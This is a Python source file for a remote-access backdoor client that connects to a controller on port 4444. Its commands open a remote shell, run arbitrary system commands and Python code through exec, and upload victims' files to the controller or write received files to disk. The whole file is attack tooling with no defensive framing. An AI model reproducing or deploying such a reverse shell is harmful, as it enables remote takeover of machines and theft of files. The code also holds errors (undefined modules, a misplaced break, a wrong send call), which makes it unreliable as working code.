import socket,pickle
import subprocess
import os
import sys
import time
import threading

def create():
    global s
    try:
        s=socket.socket()
    except socket.error:
        create()
def connect():
    try:
            
        s.connect(("127.0.0.1",4444))
            
    except socket.error:
        print("go to return connect for whlie")
        time.sleep(3.5)
        connect()


def meter():
    x=s.recv(2048).decode()
    if x=='chat':
        chat()
    elif x=='shell':
         shell()
    elif x=='upload':
         download()
         meter()
    elif x=='download':
         upload()
         meter()
    elif x=='excute':
         excute()
         meter()
    elif x=='exec1':
         exec1()
         meter()
 
    else:
         print("worng",x)
         d="wrong options select"
         s.send(d).encode()
         meter()
         
def chat():
    print("welcome to chat")
    while True:
             try:

                 d=s.recv(2048).decode()
                 print(d)

                 d=input("chat from user>")
                 s.send(d.encode())
             except socket.error:
                 print("go to return connect")
                 time.sleep(4.0)
                 main()
                 
def shell():
    print("welcome to shell")
    while True:

              try:
       
                 data=s.recv(8080).decode()

                 print(data)
                 if data=='meterpreter':
                     meter()
                 else:
                     result =  subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE,universal_newlines=True)

                     result = result.stdout.read() + result.stderr.read()

                     s.send(result.encode())

              except socket.error:
                  print("go to return connect")
                  time.sleep(4.0)
                  main()
def upload():
    try:
        print("welcome to upload")
        d="dir"
        i=sub.Popen(d,shell=True,stdin=sub.PIPE,stderr=sub.PIPE,stdout=sub.PIPE,universal_newlines=True)
        i = i.stdout.read() + i.stderr.read()
        s.send(i)

        filename=s.recv(2048).decode()
        file=open(filename,'rb')
        data=file.read(8080)
        while data:
            s.send(data)
            data=file.read(8080)
            print("sucess fully upload")
        file.close()
    except socket.error:
        print("go to return connect")
        time.sleep(4.0)
        main()
    
    
def download():
    print("welcome to download \r \n enter remote dir>")
    filename=s.recv(1024).decode()
    with open(filename, 'wb') as f:
        while True:
            data = s.recv(10000)
            print("reciving data bytes....")
            if not data:
                meter()
            else:
                f.write(data)
                
    f.close()
    print("sucess fully downlad")
    break
def excute():
    while True:
        try:
            e=s.recv(2048).decode()
            os.system(e)
        except:
            main()
def exec1():
    global data
    
    data=s.recv(2048).decode()
    t1=task.Thread(exec_thread(),args=())
    t1.start()
    meter()
def exec_thread():
    exec(data) 



def main():
    create()
    connect()
    meter()
    
    

    
main()
